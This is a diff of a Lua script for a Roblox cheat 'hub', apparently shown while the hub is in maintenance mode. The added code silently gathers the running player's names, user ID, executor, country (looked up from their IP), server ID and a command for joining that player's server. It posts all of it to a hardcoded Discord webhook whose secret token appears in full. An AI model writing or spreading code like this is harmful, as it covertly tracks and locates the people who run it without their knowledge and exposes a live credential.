@@ -3,37 +3,183 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local DISCORD_INVITE = "https://discord.gg/CDNRhNguz"
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1540216838703550536/VCPesHeNYMbP6GaTvlXvpjWA-i3F_rvvrrTvXgcym1eAMlKb_gXbQJmErCQ9qJZSyYlP"
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local DISCORD_INVITE = "https://discord.gg/CDNRhNguz"
 
-local function SendLog()
-    local data = {
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "🚫 Intento de ejecución",
-            ["description"] = "El usuario **" .. player.Name .. "** (" .. player.UserId .. ") intentó abrir el script pero está en mantenimiento.",
-            ["color"] = 16711680,
-            ["footer"] = {
-                ["text"] = "Script en mantenimiento"
-            },
-            ["timestamp"] = DateTime.now():ToIsoDate()
-        }}
-    }
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1544648762306338818/T1OrGu88pGdjioO1yYuvd-pqXwbra9co144FdIBz9Youhxtm7n0Ve4IQKSeRau0ZRlhU"
+
+local logged = false
+
+-- Función mejorada para detectar el ejecutor
+local function detectExecutor()
+    local executorName = "Desconocido"
     
-    local json = game:GetService("HttpService"):JSONEncode(data)
+    -- Método 1: identifyexecutor() (más preciso)
+    pcall(function()
+        if identifyexecutor then
+            local name, version = identifyexecutor()
+            if name then
+                executorName = tostring(name)
+                if version then
+                    executorName = executorName .. ' - ' .. tostring(version)
+                end
+                return executorName
+            end
+        end
+    end)
     
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
+    -- Método 2: Variables globales de ejecutores comunes
+    pcall(function()
+        if syn and syn.version then
+            executorName = "Synapse X - " .. syn.version
+        elseif krnl and krnl.version then
+            executorName = "Krnl - " .. krnl.version
+        elseif script and script.Name and script.Name == "Solara" then
+            executorName = "Solara"
+        elseif _G and _G.ExecutionIdentity then
+            executorName = _G.ExecutionIdentity
+        elseif getexecutorname then
+            local name = getexecutorname()
+            if name and name ~= "" then
+                executorName = name
+            end
+        end
+    end)
     
-    request({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = headers,
-        Body = json
-    })
+    return executorName
 end
 
-SendLog()
+local function sendLog()
+    if logged then return end
+    logged = true
+
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    local userId = player.UserId
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local serverTime = os.time()
+    local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)
+
+    local country = "Desconocido"
+    pcall(function()
+        local ipResponse = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=status,country'))
+        if ipResponse.status == "success" and ipResponse.country then
+            country = ipResponse.country
+        end
+    end)
+
+    -- Usar la función mejorada de detección de ejecutor
+    local executor = detectExecutor()
+
+    local avatarUrl = ""
+    pcall(function()
+        local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
+        local avatarData = game:GetService('HttpService'):JSONDecode(game:HttpGet(avatarRequest))
+        if avatarData and avatarData.data and avatarData.data[1] then
+            avatarUrl = avatarData.data[1].imageUrl
+        end
+    end)
+
+    -- Obtener nombre del mapa
+    local mapName = "Desconocido"
+    pcall(function()
+        mapName = game:GetService('MarketplaceService'):GetProductInfo(placeId).Name
+    end)
+
+    local data = {
+        ["content"] = "🚫 **¡Intento de ejecución en mantenimiento!**",
+        ["embeds"] = {{
+            ["title"] = "👤 Información del usuario",
+            ["color"] = 16711680, -- Rojo
+            ["fields"] = {
+                {
+                    ["name"] = "📛 Nombre",
+                    ["value"] = displayName .. " (@ " .. playerName .. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 User ID",
+                    ["value"] = tostring(userId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🗺️ Mapa",
+                    ["value"] = mapName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🖥️ Ejecutor",
+                    ["value"] = executor,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🌍 País",
+                    ["value"] = country,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🕐 Fecha/Hora",
+                    ["value"] = date,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔑 Server ID",
+                    ["value"] = "`" .. jobId .. "`",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📌 Comando para unirte",
+                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Irvinglz1 Hub - Modo Mantenimiento"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate(),
+            ["thumbnail"] = {
+                ["url"] = avatarUrl
+            }
+        }}
+    }
+
+    local encodedData = game:GetService('HttpService'):JSONEncode(data)
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        elseif http and http.request then
+            http.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        elseif request then
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        else
+            game:GetService('HttpService'):PostAsync(WEBHOOK_URL, encodedData, Enum.HttpContentType.ApplicationJson)
+        end
+    end)
+end
+
+-- Ejecutar el log
+task.spawn(function()
+    task.wait(1)
+    sendLog()
+end)
 
 local function ShowLoadingScreen()
     local gui = Instance.new("ScreenGui")
